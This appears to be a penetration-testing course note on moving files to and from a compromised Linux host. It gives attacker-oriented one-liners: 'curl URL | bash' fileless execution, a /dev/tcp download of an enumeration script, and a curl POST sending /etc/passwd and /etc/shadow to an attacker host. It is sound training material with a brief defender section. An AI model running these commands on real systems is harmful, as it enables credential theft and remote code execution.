
# Linux File Transfer Methods

## Introduction

Linux is a **highly flexible operating system**, and most distributions ship with **multiple built-in tools** that can be abused for file transfer. Understanding these methods helps:

* **Attackers** move tools, payloads, and exfiltrate data
* **Defenders** detect suspicious activity and harden systems

In real incidents, attackers rarely rely on just one method. They **chain multiple fallback mechanisms** to ensure success.

---

## Real Incident Example

During an incident response engagement on compromised Linux web servers:

* Attackers exploited **SQL Injection**
* Dropped a **Bash script**
* Script attempted **three download methods in sequence**:

  1. `curl`
  2. `wget`
  3. `python`

All three used **HTTP**, because:

* HTTP/HTTPS is almost always allowed
* It blends in with normal traffic
* Works across all OSes

### Key Insight

Most Linux malware:

* Avoids FTP / SMB
* Uses **HTTP/HTTPS**
* Falls back gracefully if a tool is missing

---

## Scope of This Section

We’ll cover Linux file transfer via:

* Base64 (offline)
* HTTP (wget, curl)
* Fileless execution
* Bash networking (`/dev/tcp`)
* SSH / SCP
* Web servers
* Upload techniques

---

# Download Operations (Attacker → Linux)

Assume:

* Target: Linux host (NIX04)
* Attacker: Pwnbox

---

## Base64 Encoding / Decoding (Offline Transfer)

### Use Case

* No outbound network access
* Small or medium files
* Terminal access available

---

### Step 1: Verify File Integrity

```bash
md5sum id_rsa
```

---

### Step 2: Encode File (Attacker)

```bash
cat id_rsa | base64 -w 0; echo
```

Why `-w 0`?

* Single-line output
* Easier to copy/paste

---

### Step 3: Decode on Target

```bash
echo -n '<BASE64>' | base64 -d > id_rsa
```

---

### Step 4: Verify Integrity

```bash
md5sum id_rsa
```

✔ Same hash = successful transfer

---

### Notes

* Reverse operation works for uploads
* Not suitable for very large files
* Often used in restricted shells

---

## Web Downloads with wget and curl

Most Linux systems include at least one of these.

---

### wget

```bash
wget URL -O /tmp/file.sh
```

---

### curl

```bash
curl -o /tmp/file.sh URL
```

---

### Comparison

| Tool | Strength                          |
| ---- | --------------------------------- |
| wget | Simple, reliable                  |
| curl | More flexible, scripting-friendly |

---

## Fileless Attacks on Linux

Linux pipes make **fileless execution trivial**.

### Why This Matters

* No file written to disk
* Less forensic evidence
* Harder for AV/EDR to catch

---

### Fileless with curl

```bash
curl URL | bash
```

---

### Fileless with wget

```bash
wget -qO- URL | python3
```

✔ Very common in real malware
✘ Still visible in process logs and network traffic

---

## Bash Download via `/dev/tcp`

### Use Case

* wget/curl unavailable
* Bash ≥ 2.04
* Minimal environment

---

### Open TCP Connection

```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

---

### Send HTTP Request

```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3
```

---

### Read Response

```bash
cat <&3
```

⚠ Crude but powerful
⚠ Often forgotten by defenders

---

## SSH Downloads (SCP)

SSH is often allowed outbound in enterprise environments.

---

### Start SSH Server (Attacker)

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

Verify:

```bash
netstat -lnpt | grep 22
```

---

### Download File via SCP

```bash
scp user@ATTACKER_IP:/path/file .
```

---

### Best Practice

* Use a **temporary account**
* Avoid exposing main SSH keys

---

# Upload Operations (Linux → Attacker)

Used for:

* Credential theft
* Packet captures
* Database dumps
* Forensics artifacts

---

## Web Uploads (HTTP/HTTPS)

### Attacker: Install Upload Server

```bash
pip install uploadserver
```

---

### Create TLS Certificate

```bash
openssl req -x509 -newkey rsa:2048 -nodes \
-keyout server.pem -out server.pem \
-subj '/CN=server'
```

---

### Start HTTPS Upload Server

```bash
python3 -m uploadserver 443 --server-certificate server.pem
```

---

### Upload from Target

```bash
curl -X POST https://ATTACKER_IP/upload \
-F 'files=@/etc/passwd' \
-F 'files=@/etc/shadow' \
--insecure
```

Why `--insecure`?

* Self-signed certificate

---

## Alternative: Temporary Web Server on Target

If **inbound traffic is allowed**, reverse the direction.

---

### Python 3

```bash
python3 -m http.server 8000
```

---

### Python 2

```bash
python2.7 -m SimpleHTTPServer 8000
```

---

### PHP

```bash
php -S 0.0.0.0:8000
```

---

### Ruby

```bash
ruby -run -ehttpd . -p8000
```

---

### Download from Attacker

```bash
wget TARGET_IP:8000/file.txt
```

⚠ This is **pull**, not upload
⚠ Requires inbound connectivity

---

## SCP Uploads

If outbound SSH (TCP/22) is allowed:

```bash
scp file user@TARGET_IP:/path/
```

✔ Secure
✔ Simple
✔ Reliable

---

# Recap

### Linux Download Methods

* Base64
* wget
* curl
* Fileless pipes
* `/dev/tcp`
* SCP

### Linux Upload Methods

* Base64
* HTTP POST
* Temporary web servers
* SCP

---

## Final Takeaway

**Linux file transfer is about redundancy.**

Real attackers:

* Try multiple methods
* Prefer HTTP/HTTPS
* Fall back gracefully
* Avoid writing to disk when possible

Strong defenders:

* Monitor process behavior
* Detect suspicious pipes
* Watch outbound connections
* Limit egress traffic

---
